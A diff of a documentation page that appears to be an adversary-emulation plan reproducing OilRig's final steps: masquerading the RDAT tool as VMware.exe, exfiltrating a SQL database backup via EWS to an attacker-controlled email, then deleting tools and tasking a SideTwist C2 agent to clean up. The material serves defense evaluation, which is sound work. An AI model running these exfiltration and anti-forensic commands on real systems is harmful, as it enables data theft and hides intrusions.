+        <doc-anchor-trigger class="header-anchor-trigger" to="#microscope-cited-intelligence-8">#</doc-anchor-trigger>
         <span><span class="docs-emoji">&#x1F52C;</span> Cited Intelligence</span>
     </h3>
 </doc-anchor-target>
@@ -1014,9 +1017,9 @@ files on the SQL server <code v-pre>ENDOFROAD (10.1.0.7)</code>.</p>
         <span>Step 10 - Collection and Exfiltration of Database Files</span>
     </h2>
 </doc-anchor-target>
-<doc-anchor-target id="voice-track">
+<doc-anchor-target id="microphone-voice-track-10">
     <h3>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track">#</doc-anchor-trigger>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#microphone-voice-track-10">#</doc-anchor-trigger>
         <span><span class="docs-emoji">&#x1F3A4;</span> Voice Track</span>
     </h3>
 </doc-anchor-target>
@@ -1030,38 +1033,38 @@ the data into 20000 byte chunks, and exfiltrate the chunks via EWS API to an
 attacker controlled email (<code v-pre>sistan@shirinfarhad.com</code>). The stolen data is
 obfuscated within BMP images attached to the emails sent to <code v-pre>sistan@shirinfarhad.com</code>.</p>
 <hr>
-<doc-anchor-target id="procedures">
+<doc-anchor-target id="-procedures-10">
     <h3>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures">#</doc-anchor-trigger>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#-procedures-10">#</doc-anchor-trigger>
         <span><span class="docs-emoji">&#x2623;&#xFE0F;</span> Procedures</span>
     </h3>
 </doc-anchor-target>
 <p>Create directory C:\Programdata\Vmware</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash"># OilRig has saved RDAT to disk as C:\Programdata\Nt.dat before moving and renaming it to C:\Programdata\Vmware\VMware.exe
+<pre translate="no" class="language-bash"><code v-pre class="language-bash"># OilRig has saved RDAT to disk as C:\Programdata\Nt.dat before moving and renaming it to C:\Programdata\Vmware\VMware.exe
 
 mkdir C:\Programdata\Vmware</code></pre>
 </doc-codeblock></div>
 <p>Move and rename RDAT as C:\Programdata\Vmware\VMware.exe</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash"># OilRig has saved RDAT to disk as C:\Programdata\Nt.dat before moving and renaming it to C:\Programdata\Vmware\VMware.exe
+<pre translate="no" class="language-bash"><code v-pre class="language-bash"># OilRig has saved RDAT to disk as C:\Programdata\Nt.dat before moving and renaming it to C:\Programdata\Vmware\VMware.exe
 
 move C:\Programdata\Nt.dat C:\Programdata\Vmware\VMware.exe</code></pre>
 </doc-codeblock></div>
 <p>Change directory into the SQL backup directory (PsExec has a character limit)</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">cd &quot;C:\Program Files\Microsoft SQL Server\MSSQL15.MSSQLSERVER\MSSQL\Backup\&quot;</code></pre>
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">cd &quot;C:\Program Files\Microsoft SQL Server\MSSQL15.MSSQLSERVER\MSSQL\Backup\&quot;</code></pre>
 </doc-codeblock></div>
 <p>Execute RDAT to pull back target database backup file.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash"># OilRig has used EWS APIs to exfiltrate data to an adversary controlled email
+<pre translate="no" class="language-bash"><code v-pre class="language-bash"># OilRig has used EWS APIs to exfiltrate data to an adversary controlled email
 
 C:\ProgramData\Vmware\VMware.exe --path=&quot;sitedata_db.bak&quot; --to=&quot;sistan@shirinfarhad.com&quot; --from=&quot;gosta@boom.box&quot; --server=&quot;10.1.0.6&quot; --password='d0ntGoCH4$ingW8trfalls' --chunksize=&quot;200000&quot;</code></pre>
 </doc-codeblock></div>
 <br>
-<doc-anchor-target id="source-code">
+<doc-anchor-target id="moyai-source-code-8">
     <h3>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#source-code">#</doc-anchor-trigger>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#moyai-source-code-8">#</doc-anchor-trigger>
         <span><span class="docs-emoji">&#x1F5FF;</span> Source Code</span>
     </h3>
 </doc-anchor-target>
@@ -1071,9 +1074,9 @@ C:\ProgramData\Vmware\VMware.exe --path=&quot;sitedata_db.bak&quot; --to=&quot;s
 <li>RDAT leverages EWS API to exfil chunks: <a href="../resources/rdat/program.cs#L43-L75">Program.cs#L95-L115</a></li>
 </ul>
 <br>
-<doc-anchor-target id="cited-intelligence">
+<doc-anchor-target id="microscope-cited-intelligence-9">
     <h3>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#cited-intelligence">#</doc-anchor-trigger>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#microscope-cited-intelligence-9">#</doc-anchor-trigger>
         <span><span class="docs-emoji">&#x1F52C;</span> Cited Intelligence</span>
     </h3>
 </doc-anchor-target>
@@ -1089,55 +1092,55 @@ C:\ProgramData\Vmware\VMware.exe --path=&quot;sitedata_db.bak&quot; --to=&quot;s
         <span>Step 11 - Cleanup</span>
     </h2>
 </doc-anchor-target>
-<doc-anchor-target id="voice-track">
+<doc-anchor-target id="microphone-voice-track-11">
     <h3>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track">#</doc-anchor-trigger>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#microphone-voice-track-11">#</doc-anchor-trigger>
         <span><span class="docs-emoji">&#x1F3A4;</span> Voice Track</span>
     </h3>
 </doc-anchor-target>
 <p>Step 11 emulates OilRig&#x27;s cleanup and egress from the target network.</p>
 <hr>
-<doc-anchor-target id="procedures">
+<doc-anchor-target id="-procedures-11">
     <h3>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures">#</doc-anchor-trigger>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#-procedures-11">#</doc-anchor-trigger>
         <span><span class="docs-emoji">&#x2623;&#xFE0F;</span> Procedures</span>
     </h3>
 </doc-anchor-target>
 <p>From within your PsExec session from <code v-pre>WATERFALLS</code> to <code v-pre>ENDOFROAD</code>:</p>
 <p>Delete RDAT:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-batch"><code v-pre class="language-batch">del C:\ProgramData\VMware\VMware.exe</code></pre>
+<pre translate="no" class="language-batch"><code v-pre class="language-batch">del C:\ProgramData\VMware\VMware.exe</code></pre>
 </doc-codeblock></div>
 <p>Delete the parent directory:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-batch"><code v-pre class="language-batch">rmdir C:\ProgramData\VMware</code></pre>
+<pre translate="no" class="language-batch"><code v-pre class="language-batch">rmdir C:\ProgramData\VMware</code></pre>
 </doc-codeblock></div>
 <p>Terminate the PsExec session to ENDOFROAD:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-batch"><code v-pre class="language-batch">exit</code></pre>
+<pre translate="no" class="language-batch"><code v-pre class="language-batch">exit</code></pre>
 </doc-codeblock></div>
 <p>Terminate the command prompt spawned by Mimikatz running as Tous</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-batch"><code v-pre class="language-batch">exit</code></pre>
+<pre translate="no" class="language-batch"><code v-pre class="language-batch">exit</code></pre>
 </doc-codeblock></div>
 <p>From your elevated command prompt on <code v-pre>WATERFALLS</code> (via RDP):</p>
 <p>Delete Mimikatz, RDAT, and PsExec from disk.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-batch"><code v-pre class="language-batch">del C:\Windows\System32\mom64.exe C:\Windows\temp\Nt.dat C:\Windows\System32\ps.exe</code></pre>
+<pre translate="no" class="language-batch"><code v-pre class="language-batch">del C:\Windows\System32\mom64.exe C:\Windows\temp\Nt.dat C:\Windows\System32\ps.exe</code></pre>
 </doc-codeblock></div>
 <p>From Kali:</p>
 <p>Find the PID of the SSH tunnel and terminate it.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">ps aux | grep ssh</code></pre>
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">ps aux | grep ssh</code></pre>
 </doc-codeblock></div>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">kill &lt;PID&gt;</code></pre>
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">kill &lt;PID&gt;</code></pre>
 </doc-codeblock></div>
 <p>From your C2 callback into <code v-pre>THEBLOCK</code>:</p>
 <p>Instruct the SideTwist agent to delete VALUEVAULT, the VALUEVAULT output,
 plink.exe, and the SideTwist killswitch file.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">./evalsC2client.py --set-task goTb '101 del C:\Users\gosta\AppData\Roaming\b.exe C:\Users\gosta\AppData\Roaming\fsociety.dat C:\Users\Public\Downloads\plink.exe C:\Users\gosta\AppData\Local\SystemFailureReporter\update.xml'</code></pre>
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">./evalsC2client.py --set-task goTb '101 del C:\Users\gosta\AppData\Roaming\b.exe C:\Users\gosta\AppData\Roaming\fsociety.dat C:\Users\Public\Downloads\plink.exe C:\Users\gosta\AppData\Local\SystemFailureReporter\update.xml'</code></pre>
 </doc-codeblock></div>
 <hr>
 <p><span class="docs-emoji">&#x1F534;</span> End of Scenario. <em>Note: SideTwist will continue to execute but
@@ -1147,23 +1150,23 @@ will not beacon without the update.xml file</em></p>
                                 <!-- Required only on API pages -->
                                 <doc-toolbar-member-filter-no-results></doc-toolbar-member-filter-no-results>
                             </div>
-                            <footer class="clear-both">
+                            <footer id="retype-content-footer" class="clear-both">
                             
-                                <nav class="flex mt-14">
+                                <nav id="retype-nextprev" class="print:hidden flex mt-14">
                                     <div class="w-1/2">
-                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../../managedservices/oilrig/resources/valuevault/">
+                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-body-link border border-base-border hover:border-base-border-hover rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../../managedservices/oilrig/resources/valuevault/">
                                             <svg xmlns="http://www.w3.org/2000/svg" class="mr-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19 11H7.41l5.29-5.29a.996.996 0 10-1.41-1.41l-7 7a1 1 0 000 1.42l7 7a1.024 1.024 0 001.42-.01.996.996 0 000-1.41L7.41 13H19c.55 0 1-.45 1-1s-.45-1-1-1z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
                                             <span>
-                                                <span class="block text-xs font-normal text-gray-400 dark:text-dark-400">Previous</span>
+                                                <span class="block text-xs font-normal text-base-text-muted">Previous</span>
                                                 <span class="block mt-1">VALUEVAULT</span>
                                             </span>
                                         </a>
                                     </div>
                             
                                     <div class="w-1/2">
-                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../../../managedservices/oilrig/emulation_plan/yaml/">
+                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-body-link border border-base-border hover:border-base-border-hover rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../../../managedservices/oilrig/emulation_plan/yaml/">
                                             <span>
-                                                <span class="block text-xs font-normal text-right text-gray-400 dark:text-dark-400">Next</span>
+                                                <span class="block text-xs font-normal text-right text-base-text-muted">Next</span>
                                                 <span class="block mt-1">DEPENDENCIES</span>
                                             </span>
                                             <svg xmlns="http://www.w3.org/2000/svg" class="ml-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19.92 12.38a1 1 0 00-.22-1.09l-7-7a.996.996 0 10-1.41 1.41l5.3 5.3H5c-.55 0-1 .45-1 1s.45 1 1 1h11.59l-5.29 5.29a.996.996 0 000 1.41c.19.2.44.3.7.3s.51-.1.71-.29l7-7c.09-.09.16-.21.21-.33z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
@@ -1173,15 +1176,15 @@ will not beacon without the update.xml file</em></p>
                             </footer>
                         </main>
                 
-                        <div class="border-t dark:border-dark-650 pt-6 mb-8">
-                            <footer class="flex flex-wrap items-center justify-between">
-                                <div>
+                        <div id="retype-page-footer" class="print:border-none border-t border-base-border pt-6 mb-8">
+                            <footer class="flex flex-wrap items-center justify-between print:justify-center">
+                                <div id="retype-footer-links" class="print:hidden">
                                     <ul class="flex flex-wrap items-center text-sm">
                                         <li>
-                                            <a class="inline-flex items-center mr-4 py-2 text-sm whitespace-nowrap transition-colors duration-200 ease-linear text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200 md:mb-0" href="https://github.com/attackevals/ael">
+                                            <a class="inline-flex items-center mr-4 py-2 text-sm whitespace-nowrap transition-colors duration-200 ease-linear text-footer-link hover:text-footer-link-hover md:mb-0" href="https://github.com/attackevals/ael">
                                                 <svg xmlns="http://www.w3.org/2000/svg" class="mb-px mr-1" width="18" height="18" viewBox="0 0 24 24" role="presentation">
                                                     <g fill="currentColor">
-                                                        <path d="M12 1C5.9225 1 1 5.9225 1 12C1 16.8675 4.14875 20.9787 8.52125 22.4362C9.07125 22.5325 9.2775 22.2025 9.2775 21.9137C9.2775 21.6525 9.26375 20.7862 9.26375 19.865C6.5 20.3737 5.785 19.1912 5.565 18.5725C5.44125 18.2562 4.905 17.28 4.4375 17.0187C4.0525 16.8125 3.5025 16.3037 4.42375 16.29C5.29 16.2762 5.90875 17.0875 6.115 17.4175C7.105 19.0812 8.68625 18.6137 9.31875 18.325C9.415 17.61 9.70375 17.1287 10.02 16.8537C7.5725 16.5787 5.015 15.63 5.015 11.4225C5.015 10.2262 5.44125 9.23625 6.1425 8.46625C6.0325 8.19125 5.6475 7.06375 6.2525 5.55125C6.2525 5.55125 7.17375 5.2625 9.2775 6.67875C10.1575 6.43125 11.0925 6.3075 12.0275 6.3075C12.9625 6.3075 13.8975 6.43125 14.7775 6.67875C16.8813 5.24875 17.8025 5.55125 17.8025 5.55125C18.4075 7.06375 18.0225 8.19125 17.9125 8.46625C18.6138 9.23625 19.04 10.2125 19.04 11.4225C19.04 15.6437 16.4688 16.5787 14.0213 16.8537C14.42 17.1975 14.7638 17.8575 14.7638 18.8887C14.7638 20.36 14.75 21.5425 14.75 21.9137C14.75 22.2025 14.9563 22.5462 15.5063 22.4362C19.8513 20.9787 23 16.8537 23 12C23 5.9225 18.0775 1 12 1Z"/>
+                                                        <path d="M12 1C5.923 1 1 5.923 1 12c0 4.867 3.149 8.979 7.521 10.436.55.096.756-.233.756-.522 0-.262-.013-1.128-.013-2.049-2.764.509-3.479-.674-3.699-1.292-.124-.317-.66-1.293-1.127-1.554-.385-.207-.936-.715-.014-.729.866-.014 1.485.797 1.691 1.128.99 1.663 2.571 1.196 3.204.907.096-.715.385-1.196.701-1.471-2.448-.275-5.005-1.224-5.005-5.432 0-1.196.426-2.186 1.128-2.956-.111-.275-.496-1.402.11-2.915 0 0 .921-.288 3.024 1.128a10.193 10.193 0 0 1 2.75-.371c.936 0 1.871.123 2.75.371 2.104-1.43 3.025-1.128 3.025-1.128.605 1.513.221 2.64.111 2.915.701.77 1.127 1.747 1.127 2.956 0 4.222-2.571 5.157-5.019 5.432.399.344.743 1.004.743 2.035 0 1.471-.014 2.654-.014 3.025 0 .289.206.632.756.522C19.851 20.979 23 16.854 23 12c0-6.077-4.922-11-11-11Z"/>
                                                     </g>
                                                 </svg>
                                                 <span>ATTACK Evaluations Library GitHub</span>
@@ -1189,18 +1192,18 @@ will not beacon without the update.xml file</em></p>
                                         </li>
                                     </ul>
                                 </div>
-                                <div class="docs-copyright py-2 text-gray-500 dark:text-dark-350 text-sm leading-relaxed"><p>© Copyright 2025. All rights reserved.</p></div>
+                                <div id="retype-copyright" class="print:justify-center py-2 text-footer-text font-footer-link-weight text-sm leading-relaxed"><p>© Copyright 2025. All rights reserved.</p></div>
                             </footer>
                         </div>
                     </div>
                 
                     <!-- Rendered if sidebar right is enabled -->
                     <!-- Sidebar right skeleton-->
-                    <div v-cloak class="fixed top-0 bottom-0 right-0 translate-x-full bg-white border-gray-200 lg:sticky lg:border-l lg:shrink-0 lg:pt-6 lg:transform-none sm:w-1/2 lg:w-64 lg:z-0 md:w-104 sidebar-right skeleton dark:bg-dark-850 dark:border-dark-650">
+                    <div v-cloak class="fixed top-0 bottom-0 right-0 translate-x-full bg-sidebar-right-bg border-sidebar-right-border lg:sticky lg:border-l lg:shrink-0 lg:pt-6 lg:transform-none sm:w-1/2 lg:w-64 lg:z-0 md:w-104 sidebar-right skeleton">
                         <div class="pl-5">
-                            <div class="w-32 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
-                            <div class="w-48 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
-                            <div class="w-40 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
+                            <div class="w-32 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                            <div class="w-48 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                            <div class="w-40 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
                         </div>
                     </div>
                 
@@ -1216,7 +1219,7 @@ will not beacon without the update.xml file</em></p>
     </div>
 
 
-    <div id="docs-overlay-target"></div>
+    <div id="retype-overlay-target"></div>
 
     <script data-cfasync="false">window.__DOCS__ = { "title": "Scenario Overview", level: 3, icon: "file", hasPrism: true, hasMermaid: false, hasMath: false, tocDepth: 23 }</script>
 </body>
